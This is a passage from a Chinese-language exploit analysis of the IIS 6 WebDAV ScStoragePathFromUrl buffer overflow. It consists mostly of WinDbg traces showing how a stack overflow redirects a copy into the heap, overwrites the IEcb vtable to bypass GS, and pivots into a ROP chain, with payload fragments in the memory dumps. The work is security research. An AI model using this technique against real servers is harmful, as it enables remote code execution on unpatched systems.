    00fff90c  00fff804 6711205b 00000013 00fff9c0
    00fff91c  671287e7 00000000 000000f0 00000013
可以看到，第一次ScStoragePathFromUrl的时候，拷贝的地址是一个栈地址，通过stackbuffer申请到的，但是由于memcpy引发的栈溢出，导致这个地方值会被覆盖。
    0:009> g//执行结束ScStoragePathFromUrl函数执行返回后
    Breakpoint 0 hit
    eax=00fff800 ebx=0060b508 ecx=00605740 edx=0060c828 esi=00000001 edi=77bd8ef2
    eip=67126c7b esp=00fff79c ebp=00fff7ac iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    httpext!ScStoragePathFromUrl:
    67126c7b b8150d1467      mov     eax,offset httpext!swscanf+0x14b5 (67140d15)
    0:009> g
    Breakpoint 3 hit
    eax=00000000 ebx=0060b508 ecx=00002f06 edx=00fff804 esi=00000001 edi=77bd8ef2
    eip=67125484 esp=00fff7c0 ebp=00fffc34 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    httpext!HrCheckIfHeader+0x15e:
    67125484 8bf0            mov     esi,eax
    0:009> dc fff804／／第一次memcpy之后，覆盖到了90c的位置
    00fff804  003a0063 0069005c 0065006e 00700074  c.:.\.i.n.e.t.p.
    00fff814  00620075 0077005c 00770077 006f0072  u.b.\.w.w.w.r.o.
    00fff824  0074006f 0061005c 00610061 00610061  o.t.\.a.a.a.a.a.
    00fff834  00610061 78636f68 71337761 47726936  a.a.hocxaw3q6irG
    00fff844  4b777a39 75534f70 48687a4f 6d545663  9zwKpOSuOzhHcVTm
    00fff854  39536845 5567506c 33646763 78454630  EhS9lPgUcgd30FEx
    00fff864  54316952 6a514c58 42317241 58507035  Ri1TXLQjAr1B5pPX
    00fff874  6c473664 546a3539 54435034 50617752  d6Gl95jT4PCTRwaP
    0:009> dd fff900
    00fff900  5a306272 54485938 02020202 680312c0
经过这次stack buffer overflow，这个值已经被覆盖，覆盖成了一个堆地址0x680312c0。接下来进入第二次调用。
    0:009> p
    eax=00fff910 ebx=0060b508 ecx=00000410 edx=00000000 esi=0060d32a edi=77bd8ef2
    eip=671253e2 esp=00fff7bc ebp=00fffc34 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    httpext!HrCheckIfHeader+0xbc:
    671253e2 ffd7            call    edi {msvcrt!wcslen (77bd8ef2)}
    0:009> dc 60d32a
    0060d32a  00740068 00700074 002f003a 006c002f  h.t.t.p.:././.l.
    0060d33a  0063006f 006c0061 006f0068 00740073  o.c.a.l.h.o.s.t.
    0060d34a  0062002f 00620062 00620062 00620062  /.b.b.b.b.b.b.b.
    0:009> p
    eax=0000030d
第二次获得http://localhost/bbbbb ...的长度，这个长度有0x30d，非常长，但是对应保存的位置变了。
    0:009> p
    eax=00fff800 ebx=0060b508 ecx=00fff800 edx=000002fe esi=00000000 edi=77bd8ef2
    eip=67125436 esp=00fff7c0 ebp=00fffc34 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    httpext!HrCheckIfHeader+0x110:
    67125436 50              push    eax
    0:009> p
    eax=00fff800 ebx=0060b508 ecx=00fff800 edx=000002fe esi=00000000 edi=77bd8ef2
    eip=67125437 esp=00fff7bc ebp=00fffc34 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    httpext!HrCheckIfHeader+0x111:
    67125437 ffb5d8fcffff    push    dword ptr [ebp-328h] ss:0023:00fff90c=680312c0
    0:009> dc ebp-328
    00fff90c  680312c0 52566c44 6c6d4b37 585a4f58  ...hDlVR7KmlXOZX
    00fff91c  496a7950 4a52584f 664d4150 680313c0  PyjIOXRJPAMf...h
    00fff92c  65314834 6e666f43 436c7441 680313c0  4H1eCofnAtlC...h
    00fff93c  6a415343 33307052 424c5866 6346704b  CSAjRp03fXLBKpFc
    0:009> dd 680312c0／／要用到的堆地址，这个地址会在最后用到
    680312c0  00000000 00000000 00000000 00000000
    680312d0  00000000 00000000 00000000 00000000
    680312e0  00000000 00000000 00000000 00000000
可以看到，第二次利用的时候，会把ebp-328这个地方的值推入栈中，这个地方应该是stack
buffer的地址，应该是个栈地址，但是现在变成了堆地址，就是由于第一次栈溢出，覆盖了这个变量。
而这个值，会作为参数传入ScStorageFromUrl函数，作为memcpy拷贝的值。
这也就解释了为什么我们在上面分析漏洞的时候，会是向堆地址拷贝，而这一次拷贝，就不需要控制长度了，因为这个地方的值已经是堆地址，再怎么覆盖，也不会覆盖到cookie。这里未来要覆盖IEcb虚表结构。从而达到漏洞利用。这样，第二次向堆地址拷贝之后，这个堆地址会覆盖到IEcb的虚表，这个虚表结构会在最后利用时引用到。
在PoC中，有一处，这个会触发漏洞利用，是在CheckIfHeader之后到达位置，在CheckIfHeader的PszToken函数判断没有<>的http
url之后，break掉，之后进入lock token处理。
    0:009> p
    eax=67140d15 ebx=00fffbe8 ecx=680313c0 edx=0060e7b0 esi=00fffc28 edi=00000104
    eip=67126c80 esp=00fff940 ebp=00fff950 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
    httpext!ScStoragePathFromUrl+0x5:
    67126c80 e803100000      call    httpext!_EH_prolog (67127c88)
    0:009> kb
    ChildEBP RetAddr  Args to Child              
    00fff93c 67119469 00fffab4 00fff9a4 00000000 httpext!ScStoragePathFromUrl+0x5
    00fff950 67125740 0060e7b0 00fffab4 00fff9a4 httpext!CMethUtil::ScStoragePathFromUrl+0x18
    00fffbd0 664d4150 680313c0 65314834 6e666f43 httpext!CParseLockTokenHeader::HrGetLockIdForPath
    +0x119
    WARNING: Frame IP not in any known module. Following frames may be wrong.
    00fffc3c 6711f68e 0060b508 0060584e 80000000 0x664d4150
    00fffc78 6711f7c5 0060c010 00fffcd4 671404e2 httpext!CPropFindRequest::Execute+0x125
这时候对应的IEcb已经被覆盖，这样，在进入ScStoragePathFromUrl函数之后，会进入我们在漏洞分析部分提到的CheckPrefixUrl函数，这个函数中有大量的IEcb虚表虚函数引用。
    0:009> p
    eax=680313c0 ebx=00fffbe8 ecx=680313c0 edx=00fff4f8 esi=0060e7b0 edi=680313c0
    eip=671335f3 esp=00fff4b4 ebp=00fff4d0 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    httpext!ScStripAndCheckHttpPrefix+0x1e:
    671335f3 ff5024          call    dword ptr [eax+24h]  ds:0023:680313e4=68016082
    0:009> dc eax
    680313c0  680313c0 68006e4f 68006e4f 766a4247  ...hOn.hOn.hGBjv
    680313d0  680313c0 4f744257 52345947 4b424b66  ...hWBtOGY4RfKBK
和大家分享了这个精妙利用，一般可能都会觉得是第二次url bbbbb的这个memcpy覆盖了关键函数导致的溢出、利用，实际上，在第一次url
aaaaaa中，就已经引发了栈溢出，覆盖到了stackbuffer申请的指向栈buffer的指针，这个指针存放在栈里，用于后续调用存放虚拟路径，由于第一次栈溢出，覆盖到了这个变量导致第二次url
bbbbb拷贝的时候，是向一个堆地址拷贝，这个堆地址后面的偏移中，存放着IEcb的vftable，通过覆盖虚表虚函数，在最后locktoken触发的ScStoragePathFromUrl中利用虚函数达到代码执行。
而这个过程，也是巧妙的绕过了GS的检查。
* * *
### 简析ROP及shellcode
* * *
这个漏洞使用了一些非常有意思的手法，一个是TK教主在13年安全会议上提到的shareduserdata，在ROP中，另一个是alpha shellcode。
首先，在前面虚函数执行之后，会先进行stack pivot，随后进入rop。
    0:009> t//stack pivot!!!
    eax=680313c0 ebx=00fffbe8 ecx=680313c0 edx=00fff4f8 esi=0060e7b0 edi=680313c0
    eip=68016082 esp=00fff4b0 ebp=00fff4d0 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    rsaenh!_alloca_probe+0x42:
    68016082 8be1            mov     esp,ecx
    0:009> p
    eax=680313c0 ebx=00fffbe8 ecx=680313c0 edx=00fff4f8 esi=0060e7b0 edi=680313c0
    eip=68016084 esp=680313c0 ebp=00fff4d0 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    rsaenh!_alloca_probe+0x44:
    68016084 8b08            mov     ecx,dword ptr [eax]  ds:0023:680313c0=680313c0
    0:009> p
    eax=680313c0 ebx=00fffbe8 ecx=680313c0 edx=00fff4f8 esi=0060e7b0 edi=680313c0
    eip=68016086 esp=680313c0 ebp=00fff4d0 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    rsaenh!_alloca_probe+0x46:
    68016086 8b4004          mov     eax,dword ptr [eax+4] ds:0023:680313c4=68006e4f
    0:009> p
    eax=68006e4f ebx=00fffbe8 ecx=680313c0 edx=00fff4f8 esi=0060e7b0 edi=680313c0
    eip=68016089 esp=680313c0 ebp=00fff4d0 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    rsaenh!_alloca_probe+0x49:
    68016089 50              push    eax
    0:009> p//ROP Chain
    eax=68006e4f ebx=00fffbe8 ecx=680313c0 edx=00fff4f8 esi=0060e7b0 edi=680313c0
    eip=6801608a esp=680313bc ebp=00fff4d0 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    rsaenh!_alloca_probe+0x4a:
    6801608a c3              ret
    0:009> p
    eax=68006e4f ebx=00fffbe8 ecx=680313c0 edx=00fff4f8 esi=0060e7b0 edi=680313c0
    eip=68006e4f esp=680313c0 ebp=00fff4d0 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    rsaenh!CPEncrypt+0x3b:
    68006e4f 5e              pop     esi
    0:009> p
    eax=68006e4f ebx=00fffbe8 ecx=680313c0 edx=00fff4f8 esi=680313c0 edi=680313c0
    eip=68006e50 esp=680313c4 ebp=00fff4d0 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    rsaenh!CPEncrypt+0x3c:
    68006e50 5d              pop     ebp
    0:009> p
    eax=68006e4f ebx=00fffbe8 ecx=680313c0 edx=00fff4f8 esi=680313c0 edi=680313c0
    eip=68006e51 esp=680313c8 ebp=68006e4f iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    rsaenh!CPEncrypt+0x3d: